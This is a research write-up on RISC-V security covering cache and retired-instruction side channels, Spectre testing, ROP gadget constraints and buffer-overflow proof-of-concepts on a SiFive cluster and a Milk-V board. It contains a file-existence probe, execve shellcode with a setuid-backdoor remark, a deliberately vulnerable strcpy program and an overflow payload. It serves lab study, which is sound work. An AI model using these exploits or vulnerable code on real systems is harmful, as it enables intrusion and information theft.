# Analysis of RISC-V Security

<p align="center">
<img src='img/riscv.jpg' width='400'>
</p>

# Side channel attacks
In computer security, a side-channel attack is any attack based on extra information that can be gathered because of the fundamental way a computer protocol or algorithm is implemented, rather than flaws in the design of the protocol or algorithm itself. In this study case, the attacks will work only if the microarchitecture offers **[out of order execution](https://www.cs.uaf.edu/2011/spring/cs641/proj1/vsanditi/)** and **[speculative execution](https://en.wikipedia.org/wiki/Speculative_execution)**.

## Cache Flush and Reload (mitigated)

<img src='img/flush-reload.png' width='500'>

Usually after a cache miss the data is fetched from the DRAM, but the second time is fetched from the CPU cache that is much faster.

<img src='img/shared-memory.png' width='500'>

After the attacker flushes the cache, the victim now loads (due to a read operation) a data on the empty cache. 
Now the attacker can read data and due to its access time knows if the data is loaded in cache or not.

## Cache Flush and Fault (new approach)

Again the attacker flushes the cache, then it jump to the address containing victim cache line and handles the error. From the timing of the fault the attacker can predict if the data was on cache or not.

<img src='img/fault-reload.png' width='500'>

## [Performance Counters](https://docs.openhwgroup.org/projects/cv32e40x-user-manual/en/latest/perf_counters.html)

They give a benchmarking capability. They can count report events like cache missed, instruction executed, CPU frequency etc...
By default performance counters are available also to the attackers on the system. The mitigation for this type of attacks is making the interface root only.

<img src='img/branch-taken.png' width='500'>

*Some performance counters still remain privileges by standard.* The events are privileged apart from a few. The "branch taken" event is now privileged, but remains the number of **CPU cycles elapsed** and the **number of instruction retired**.

## KASLR: Kernel Address Space Layout Randomization

Randomization of address space at every boot of the system. An attacker to use a memory exploit has to know the addresses of the program before running it.

### BPU: Branch-Prediction Unit

The core idea of this methodolody is that branches impact execution speed. Knowing that there is a jump still doesn't tell what jump is taken in the code.
At this part it comes the **Optimize by Prediction**. The CPU has a history of last branches to optimize the future branches. For example if a code is "always" the processor tends to optimize the jump pre-loading the false branch condition.

## CPU OPTIMIZATION: Speculative Execution

Instead of only predicting the branch, the CPU could actually execute the prediction. That makes modern CPUs very fast. [Spectre](https://spectreattack.com/spectre.pdf) used this optimization to exploit the CPU. *Some RISC-V doesn't have speculative execution*, but they have **speculative prefetching**.
This means that the attacker can let the CPU prefetch whatever he wants.

<img src='img/prefetch.png' width='500'>

This also means that **the Speculative Prefetching is exploitable** and Spectre can be exploited on some RISC-V processors. On some specific CPUs it is present the limited speculation that mitigates this attacks.

The speculative execution is often removed from RISC-V processors (for example is missing in the [SiFive](https://www.sifive.com/)) but is present in recent microarchitectures as the [C910/C920](https://github.com/sophgo/sophgo-doc/blob/main/SG2042/T-Head/XuanTie-C910-C920-UserManual.pdf). In the CPU itself, this type of speculation is given by the precondition of the microarchitecture to do [indirect branches](https://en.wikipedia.org/wiki/Indirect_branch), that is the possibility to jump to a register instead of a address jump.

## Case Study: Monte Cimone's RISC-V SiFive u74-mc

On the Monte Cimone's RISC-V cluster it is present the [SiFive U74-MC](https://starfivetech.com/uploads/u74mc_core_complex_manual_21G1.pdf). As the manual says and [as reported from the SiFive statement](https://www.sifive.com/blog/sifive-statement-on-meltdown-and-spectre), the IP core is not allowed to perform speculative execution:

"_Meltdown attacks (CVE-2017-5754) rely upon speculative access to memory that the processor does not have permission to access; our processors do not perform this form of speculation. The Spectre attacks (CVE-2017-5753 and CVE-2017-5715) rely upon speculative memory accesses causing cache state transitions; our processors do not speculatively refill or evict data cache lines._"

Let's try it in the SiFive present on the cluster 

<img src='img/sifive-arch.png' width='500'>

I will run [this](https://github.com/cispa/Security-RISC/tree/main/spectre) spectre POC for RISC-V from Lukas Gerlach, Michael Schwarz and Daniel Weber.

<img src='img/strace-sifive.png' width='500'>

As expected this type of attack is mitigated in this processor due to the **limited speculation**. In general, more optimized cores are more vulnerable. This attack actually works on C910 that allows speculative execution.

## Case Study: Discover Hidden files with retired instructions

In many RISC-V Core implementation there is a counter for the number of instructions retired during the program execution. As the [SiFive U74 manual](https://www.scs.stanford.edu/~zyedidia/docs/sifive/sifive-u74.pdf) says, the `RDINSTRET rd` "Reads the64-bits of the instret CSR, which counts the number of instructions retired by this hart from some arbitrary start point in the past." 
The useful user-space accessible register for the SiFive RISC-V implementation are

```
RDCYCLE rd Reads the64-bits of the cycle CSR which holds a count of the number of clock cycles executed by the processor core on which the hart is running from an arbitrary start time in the past.
RDTIME rd Generates an illegal instruction exception. The mtime register is memory mapped to the CLINT register space and can be read using a regular load instruction.
RDINSTRET rd Reads the64-bits of the instret CSR, which counts the number of instructions retired by this hart from some arbitrary start point in the past.
```

In the [PoC](https://github.com/cispa/Security-RISC/blob/main/rlibsc.h) implementation of Cispa's researchers, the `rdinstret` register is printed as follows

```c
static inline size_t rdinstret() {
  size_t val;
  asm volatile("rdinstret %0" : "=r"(val));
  return val;
}
```

Now we can get the number of instructions retired during the execution of a program. 
An interesting side-channel attack comes out from this. As the researchers present in the [Access Retired PoC](https://github.com/cispa/Security-RISC/tree/main/access-retired), the value of rdinstret can be used to see what the processor has "prefetched". The PoC tries to open various files, which always fails (return value is NULL). However, the number of retired instructions is higher if the file exists. The core concept of this experiment is presented below.

```c
size_t before = rdinstret();
f = fopen(p, "r");
size_t after = rdinstret();
size_t delta = after - before;
```

Here, if the file is present on the filesystem, the number of instructions retired will be higher because **the value of f will not be NULL**. Running the experiment on a folder with no listing permission will give the following result

<img src='img/access-retired.png' width='700'>

### NOP retired instructions

Another example to understand better the number of the retired instruction is [this NOP example](https://github.com/BlessedRebuS/RISCV-Attacks/blob/main/bin/access-retired/example-nop.c). The program has 10x10 `NOP` instructions, executed only if the branch is taken. 

```c
size_t before = rdinstret();
if (COND){	
	asm volatile("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
	asm volatile("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
	asm volatile("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
	asm volatile("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
	asm volatile("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
	asm volatile("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
	asm volatile("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
	asm volatile("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
	asm volatile("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
	asm volatile("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  }
size_t after = rdinstret();
```

With COND = 0 (false) this is the output

<img src='img/nop-false.png' width='700'>

With COND = 1 (true) this is the output

<img src='img/nop-true.png' width='700'>

Here It is clear how the Out of Order execution, mixed with some speculative mechanism is prefetching the code that has to be run. In this case the NOP is 1 byte long and count as an instruction itself, hence the difference between the two executions (one with the NOP and one without it) differs by 100 instructions, as underlined in the screenshots.

### What to do with this?

This can lead to bruteforce attacks in the filesystem to access unlistable directories or more complex memory based attacks. 

A simple implementation of that, can be [this extension](https://github.com/BlessedRebuS/RISCV-Attacks/blob/main/bin/access-retired/dir-list.c) to bruteforce users' home directories and find who in the system has the file `test`. 

# Control Flow Integrity: Buffer Overflow & Return Oriented Programming 
In this section It will be analyzed memory attacks such as ROP (Return Oriented Programming) with or without a Buffer Overflow entrypoint.

## ISA Analysis
### Function Calls: Callee and Caller
In programming, the function that calls another function is the `caller` and the called function is the `callee` or `leaf function`. The main itself is a caller function, because It initialzies and call all the following function calls, but is also a callee because It is called at the start of the program by the **start** function. As the image below shows, in the [RISC-V calling convention](https://riscv.org/wp-content/uploads/2015/01/riscv-calling.pdf) there are 12 integer registers (S0-S11) and 12 floating point registers (FS0-FS11) that are preserved across function calls and must be saved by the callee if they are used.
Generally a callee performs a task or computations and returns the result to the caller, _eg: function that performs a sum_.
A function, such as the `main()` function, can be both caller and callee.
In conclusion, callers can use the "S" registers to get the result saved by the callee and callees can use the "T" (temporary) registers to temporary save the data. This is generally true until the program runs out of registers and in this case both the S and T registers can be used, but at the end they have to be backed up.

<img src='img/caller-callee.png' width='500'>

## 64bit RISC-V Assembly
All the specifications of the RISC-V Assembly are described in the [official manual](https://riscv.org/wp-content/uploads/2017/05/riscv-spec-v2.2.pdf) at Chapter 20.

### Simple Syscall
The following asm code use the system call `exit` loaded with the value `1`. 

```asm
.global _start

.section .text
_start:
	li a0, 1
	li a7, 93
	ecall
```

We can find the syscall number for the riscv64 and many other architectures [here](https://gpages.juszkiewicz.com.pl/syscalls-table/syscalls.html). In this case the exit syscall has the number 93, so It has to be loaded in the register `a7`, **that holds the system call code** and it is called with the parameter 1, loaded in the register `a0`. The `ecall` instruction tells the system to run the system call mapped in the register a7 with the arguments mapped in the argument registers, in this case only a0.

After that, because this is not run through an emulator or in a VM, It will be compiled with the basic GNU assembler.

```bash
riscv64-linux-gnu-as simple_syscall.s -o simple_syscall.o
riscv64-linux-gnu-ld simple_syscall.o -o simple_syscall
```

This will generate an ELF `simple_syscall` program, runnable with

```bash
./simple_syscall
```

We can check the exit status with 

```bash
echo $?
```

And It will tell the last exit status of a program, in this case it will be "1"

### Simple execve: executing /bin/bash

```asm
.global _start

.section .text
_start:
	la a0, shell
	li a1, 0
	li a2, 0
	li a7, 221
	ecall 

	li a0, 1
	li a7, 93
	ecall

shell:
 .ascii "/bin/bash"
```

Here the asm code for calling a simple shell. This will pop a normal shell for the same user that runs the program. The **/bin/bash** string can be replaced to run other type of syscalls. If this program had a setuid bit, the owner was **root** and the bash call preserved the setuid, this program can be a backdoor for the system we are in.

<img src='img/simple_execve.png' width='600'>

### Simple execve: executing /bin/bash - GCC variant

The following code is generated by GCC that uses libraries. Here we can see that the system call is not an ecall, but is first a jump to the execve function in the C library. In terms of exploitation, this means that there is a "prologue" and an "epilogue" of a function to be respected when calling the execve and the registers we are using in the current call are not preserved across function calls, hence an exploitation is more difficult for this scenario.

```asm
   0x0000000000000668 <+0>:	addi	sp,sp,-16
   0x000000000000066a <+2>:	sd	ra,8(sp)
   0x000000000000066c <+4>:	sd	s0,0(sp)
   0x000000000000066e <+6>:	addi	s0,sp,16
   0x0000000000000670 <+8>:	li	a2,0
   0x0000000000000672 <+10>:	li	a1,0
   0x0000000000000674 <+12>:	auipc	a0,0x0
   0x0000000000000678 <+16>:	addi	a0,a0,36 # 0x698
   0x000000000000067c <+20>:	jal	ra,0x5a0 <execve@plt>
   0x0000000000000680 <+24>:	li	a5,0
   0x0000000000000682 <+26>:	mv	a0,a5
   0x0000000000000684 <+28>:	ld	ra,8(sp)
   0x0000000000000686 <+30>:	ld	s0,0(sp)
   0x0000000000000688 <+32>:	addi	sp,sp,16
   0x000000000000068a <+34>:	ret
```

## ROP Contraints
As It is well explained [here](https://arxiv.org/pdf/2007.14995.pdf), the open source nature of the ISA, brought some security updates to mitigate some ROP attacks. ROPs are built using gadget found across the asm code, that in RISC-V translates in using the epilogue of a function and knowing that the used registers has to be restored. One more complication is the usage of the link register. The purpose of this register is to optimize calls to leaf subroutines since the return address need not be pushed or popped on the stack as It happens in X86_64. As It is specified in the paper, to have a full functional and chainable ROP gadget the following contraints have to be satisfied:

* ROP exploitation is mostly limited to **non-leaf function epilogues**
* Loads a value from a(**sp**) into **ra** where a is some positive immediate value divisible by 8
* Adds an immediate value b to **sp** where b > a and b is divisible by 16 (due to stack-alignment requirements)
* Ends in a **ret** (equivalent to **jr ra**)
* Find some extra instruction to perform operations in the ROP

After that, as suggested in [this](https://pure.royalholloway.ac.uk/ws/portalfiles/portal/37157938/ROP_RISCV.pdf) paper, It could be used a nested function call to emit these save and restore sequences for the registers. As they say, the presence of a **restore sequence** is crucial for mounting a ROP attack, as we need to tamper with the return address register **ra**, which is callee-saved.

### Non-Leaf functions
Consider the following C function

```c
int test_empty() {
    int test = 1;
    printf("test");
    return 1;
}
```

That can be disassembled with

```bash
disasm test_empty()
```

Here there is the disassembled code, using GDB

```gdb
Dump of assembler code for function test_empty:
   0x0000000000000802 <+0>:	addi	sp,sp,-32
   0x0000000000000804 <+2>:	sd	s0,24(sp)
   0x0000000000000806 <+4>:	addi	s0,sp,32
   0x0000000000000808 <+6>:	li	a5,1
   0x000000000000080a <+8>:	sw	a5,-20(s0)
   0x000000000000080e <+12>:	li	a5,1
   0x0000000000000810 <+14>:	mv	a0,a5
   0x0000000000000812 <+16>:	ld	s0,24(sp)
   0x0000000000000814 <+18>:	addi	sp,sp,32
   0x0000000000000816 <+20>:	ret
```

This asm code can't jump to another function and is a "dead end" for the ROP chain. To bypass this wall we must use non-leaf functions. Let's try to add a simple nested function call inside the test_empty().

```c
int test_empty2() {
    int test = 1;
    return 1;

}
int test_empty() {
    test_empty2();
    return 1;
}
```

The disassembled of the test_empty now is the following

```gdb
Dump of assembler code for function test_empty:
   0x0000000000000818 <+0>:	addi	sp,sp,-16
   0x000000000000081a <+2>:	sd	ra,8(sp)
   0x000000000000081c <+4>:	sd	s0,0(sp)
   0x000000000000081e <+6>:	addi	s0,sp,16
   0x0000000000000820 <+8>:	jal	ra,0x802 <test_empty2>
   0x0000000000000824 <+12>:	li	a5,1
   0x0000000000000826 <+14>:	mv	a0,a5
   0x0000000000000828 <+16>:	ld	ra,8(sp)
   0x000000000000082a <+18>:	ld	s0,0(sp)
   0x000000000000082c <+20>:	addi	sp,sp,16
   0x000000000000082e <+22>:	ret
```

Here we se that the ra register is modified with

`0x000000000000081a <+2>:	sd	ra,8(sp)`

and the value is loaded with

`0x0000000000000828 <+16>:	ld	ra,8(sp)`

From this example It is clear that to build gadget a non-leaf function should be used or a leaf function should be modified to embed a **dummy** function call.

`Another consideration is that without the ra register, hence in a leaf function, neither the initial buffer overflow can be done because no ra register is used and no return address can be overwritten.`

## Global register manipulation
Using inline ASM we can overwrite the callee saved registers (s2-s11) with arbitrary value. Those registers are by convention not reset and then GCC at compile time doesn't handle the prologue and epilogue of those registers. For this we can pass the value of those register in all the C program. A simple function that sets the **s2** register is the following.

```c
void not_called(){
    asm volatile ("li s2, 1");
    return;
}
```

We can then print this in another part of the program and across two functions (main and not_called). In this case the value of s2 will be 1 because of the load immediate.

<img src='img/s2-reg.png' width='400'>

## Manipulating exit() syscall status code with S registers
Using the previous assumtpions, we can now control the system call arguments using values passed across the functions using callee saved registers.
In this PoC I will use the **S2** register as the argument passed to the _exit_ system call. The PoC consists in a jump from the cuntion not_called to the exit function but just after the S2 register is set. In this way the S2 register is the register preserved in the not_called function that the attacker can control. 
The jump lands after in the instruction `asm volatile ("mv a0, s2")` and loads with the value 1 the register S2 that reflects in the value 1 on the exit system call.

```c
#include <stdio.h>

void not_called(){
	asm volatile ("li s2, 1");
	asm volatile ("jal ra, exit_function +22");
	return;
}

void exit_function(){
	printf("exit function\n");
	asm volatile ("li s2, 0");
	asm volatile ("mv a0, s2");
	asm volatile ("li a7, 93");
	asm volatile ("ecall");
	return;
}

int main(){
	register long s2 asm ("s2");
	asm volatile ("jal ra, not_called");
	printf("Val of res: %ld\n", s2);
	return 0;
}
```

Now with `echo $?` I can print the exit status code. If the exit_function() would be executed entirely It should returns the value `0`, but with the S2 manipulation returns `1`.

<img src='img/manipulate_exit.png' width='700'>

Using **ROPGadget** we can actually see the two gadgets we are using to manipulate the _exit_ output. 

<img src='img/ROPGadgets_s2.png' width='1000'>

## Manipulating exit function status code with A registers
RISC-V registers, except for **x0** are general purpose. This means that every register can be used for anything. In compiled programs usually is the compiler that takes care of prologues and epilogues of the functions and of the state of the registers. The following PoC uses the register **a1** as the argument for the _exit()_ function. Once again the **not_called** function is jumping to the offset (+22) of the call, replacing the value 1 with 0.

```c
#include <stdio.h>
#include <stdlib.h>

void not_called(){
        asm ("li a5, 1");
        asm ("jal ra, exit_function +20");
        return;
}

void exit_function(){
        printf("exit function");
        exit(0);
        return;
}

int main(){
        register long s2 asm ("s2");
        asm volatile ("jal ra, not_called");
        printf("Val of res: %ld\n", s2);
        return 0;
}
```

As before, this result in a exit return value of 1.

<img src='img/manipulate_exit_a0.png' width='700'>

## Manipulating exit syscall status code with ROP
Using Return Oriented Programming is it possible hence to manipulate registers. In the previous codes the call was straightforward and done with the normal code execution. This time a particular piece of code will be called (code reuse) and will set a register with a value. This value will be passed to the syscall as argument and the program flow will be interrupted to use. Depending on what piece of code, then what return address is taken, the exit function will have a value or another value.

<img src='img/rop_exit.png' width='700'>

In yellow It is highlighted the difference between a direct jump to `not_called` or a jump that goes first in the `test_empty2` function.

## Manipulating exit syscall status using arbitrary stack values
We can exploit this different type of program, knowing that the a6 register will be overflow after the **56th** character put in the buffer. Once had the overflow to the not_called function, we return directly to the point the a6 value is overwritten and here we find our arbitrary filled buffer (and then arbitrary crafted stack) that will be copied in the a0 register and will be used as argument of the **exit** function. The ecall runs the system call.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void not_called() {
    printf("exit function\n");
    asm volatile ("li a6, 0");
    asm volatile ("mv a0, a6");
    asm volatile ("li a7, 93");
    asm volatile ("ecall");
    return;
}

int test_empty() {
    printf("Empty function\n");
    return 1;
}

void vulnerable_function(char* string) {
    char buffer[64];
    test_empty();
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    vulnerable_function(argv[1]);
    return 0;
}
```

Here, after the 56th character the a6 register is overwritten with the arbitrary **HEX** value put in the exploit. If the **not_called** function was executed normally It would result in a exit code 0.
The following code will give an exit value of 1.

```bash
./rop.out "$(python3 -c 'print("A"*56 + "\x01" + "B"*15 + "\x5a\x05\x01\x00")')"
$?
> 1
```

Give that, replacing this character will give us an arbitrary value of the exit function and this means that **we can control the exit system call return value**.

<img src='img/exit_manipulation_stack.png' width='700'>

---

## Testing the MILK-V Duo S board
Milk-V Duo S is an upgraded model of Duo, featuring an upgraded **SG2000** main controller with a larger 512MB memory and expanded IO capabilities. It integrates wireless capabilities with WI-FI 6/BT 5, and comes equipped with a USB 2.0 HOST interface and a 100Mbps Ethernet port for user convenience. Supporting dual cameras (2x MIPI CSI 2-lane) and MIPI video output (MIPI DSI 2-lane), it allows for versatile applications. The device also supports switching between RISC-V and ARM boot through a switch. With enhanced functionality, Duo S is better suited for a variety of scenarios with more complex project development requirements.

### eMMC version firmware burning
[As the documentation says](https://milkv.io/docs/duo/getting-started/duos), the Duo S doesn't have a firmware and It has to be burned. We can do via Windows following these steps

. Install driver

. Download the USB driver installation tool: [CviUsbDownloadInstallDriver.zip](https://github.com/milkv-duo/duo-buildroot-sdk/releases/download/Duo-V1.1.0/CviUsbDownloadInstallDriver.zip). After downloading, unzip and install.

. Download burning tool

. Download the command line burning tool under Windows [CviBurn_v2.0_cli_windows.zip](https://github.com/milkv-duo/duo-buildroot-sdk/releases/download/Duo-V1.1.0/CviBurn_v2.0_cli_windows.zip), unzip it after downloading.

. Download firmware

Download the latest version of DuoS eMMC firmware, currently [milkv-duos-emmc-v1.1.0-2024-0410.zip](https://github.com/milkv-duo/duo-buildroot-sdk/releases/download/Duo-V1.1.0/milkv-duos-emmc-v1.1.0-2024-0410.zip).

Once downloaded the cli, inside the CviBurn cli folder we can run

```powershell
.\usb_dl.exe -s linux -c cv181x -i .\extracted
```

Where the extracted folder is the extracted firmware.

### Serial connetion using UART

Using some UART to USB tool we can connect via serial communication to the board. I used [this one](https://www.amazon.it/dp/B07TXVRQ7V?psc=1&ref=ppx_yo2ov_dt_b_product_details) from Amazon.

<img src='img/uart_usb.jpg' width='500'>

I wired up as the documentation says, with the following pinout


GND (pin 6)	<--->	Black wire

TX (pin 8)	<--->	White wire

RX (pin 10)	<--->	Green wire


<img src='img/duo_uart.jpg' width='350'> <img src='img/duo_up.jpg' width='600'>

Now using PuTTY or some serial tool as `minicom` we can read the Duo S serial interface. Here we can see the [OpenSBI](https://github.com/riscv-software-src/opensbi) and the boot process of the device.

<img src='img/bootloader.png' width='500'>

### Flashing Custom Linux (Ubuntu 22.04)
The flashed ISO is just a custom Buildroot of Linux, so there is no package manager or other tools, but only stuff like micropython, but we can compile or flash our custom operating system.

To compile ourselves the system we have to _cross-compile_ It using **qemu**, then replace the rootfs of the system with the one created with in the emulated system and then flash it.
Another faster option is using prebuilt ISO images, like [this one](https://drive.google.com/file/d/1y1NQamzUDzot_kVT2yKkbusoJmtvH5tD/view?usp=sharing) of Ubuntu 22.04. This image is specifically for Milk-V Duo 256M, but it has pretty much the same architecture as the Milk-V Duo S, so It can be compatible. Once downloaded the ISO, we can use BalenaEtcher to flash on the SD card the ISO, then the SD card should be inserted in the Board before boot.

<img src='img/duo_bottom.jpg' width='600'>

We have to wait for a few seconds and then SSH into the board. We can use the RNDIS USB connection if we have the drivers, but I suggest to SSH into the Board plugging an Ethernet cable and doing it local IP. Now the board is up and running with an Ubuntu 22.04 inside.

<img src='img/ubuntu-milkv.png' width='600'>

Once logged in I am configuring it to talk as the default gateway with my firewall and not the USB connection using

```bash
ip route del default via 192.168.42.2 dev usb0
ip route add default via 192.168.2.99 dev eth0
```

And i replace the `/etc/apt/sources.list` with the latest repo available for RISC-V Ubuntu 22.04.

```txt
deb http://ports.ubuntu.com/ubuntu-ports jammy main restricted universe multiverse
deb-src http://ports.ubuntu.com/ubuntu-ports jammy main restricted universe multiverse

deb http://ports.ubuntu.com/ubuntu-ports jammy-updates main restricted universe multiverse
deb-src http://ports.ubuntu.com/ubuntu-ports jammy-updates main restricted universe multiverse

deb http://ports.ubuntu.com/ubuntu-ports jammy-backports main restricted universe multiverse
deb-src http://ports.ubuntu.com/ubuntu-ports jammy-backports main restricted universe multiverse

deb http://ports.ubuntu.com/ubuntu-ports jammy-security main restricted universe multiverse
deb-src http://ports.ubuntu.com/ubuntu-ports jammy-security main restricted universe multiverse

deb http://archive.canonical.com/ubuntu jammy partner
deb-src http://archive.canonical.com/ubuntu jammy partner
```

Then the board can reach the Internet and the package manager can download updates and packages.

<img src='img/duo_update.png' width='600'>

To install custom distros on other boards like the **Milk-V Duo** or **Milk-V Duo 256M** It can be done the same thing but you have to solder the pins to get to the serial console and get the Ethernet connection.

### Led Blink using GPIO
Using General Purpose I/O pins we can generate signals to power on simple things like leds. For the pin N 466 looking at the pinout of the Milk-V we can turn It on providing 3.3V with the following.

```bash
export 466 > /sys/class/gpio/export
echo out > /sys/class/gpio/gpio466/direction
echo 1 > /sys/class/gpio/gpio466/value
```

<img src='img/blink.jpg' width='600'>

And to turn It off

```bash
echo 1 > /sys/class/gpio/gpio466/value
```

A simple C program that export and writes the value on the GPIO interface is [the following](https://raw.githubusercontent.com/BlessedRebuS/RISCV-Attacks/main/bin/led_blink/led_blink.c?token=GHSAT0AAAAAACNVEGJNJ5ZPFGDBGQWLTFJIZSI334Q). 

### Buffer Overflow on the MILK-V
On the RISC-V board, after turning off ASLR [the BOF](https://raw.githubusercontent.com/BlessedRebuS/RISCV-ROP-Testbed/main/buffer_overflow/risc_bof.c) is the same as a normal RISC-V architecture. Strangely _it uses the same addressess_ also if the program is compiled on different microarchitecture, like the SiFive chips.

<img src='/img/milkv-bof.png' width='600'>

### Manipulating LED color on the MILK-V board with Buffer Overflow / Return Oriented Programming
Using a little variation of the BOF, we can control the led output of a the board, modifying also the timing behiaviour of the program. Exploiting a buffer overlow in a specific place of the code will overwrite the **RA** and cause a loop on the blink function. As the result we get a permanent blinking **red LED** instead of a single blink of a **green LED**. [Here the is a video for the PoC](https://github.com/BlessedRebuS/RISCV-Attacks/raw/main/img/blink-bof-demo.mov). 
I can think this attack in a scenario of a working mechanical and electric element that has to output his state thourgh LEDs and is now manipulated by the attacker.

<a href="https://github.com/BlessedRebuS/RISCV-Attacks/raw/main/img/blink-bof-demo.mov"><img src='img/blink-bof-screen.jpg' width='1200'></a>

---
### Resources
[Black Hat conference ](https://www.youtube.com/watch?v=HCZ6DCu2ciE) and [RISC-V Attacks POC](https://github.com/cispa/Security-RISC/)
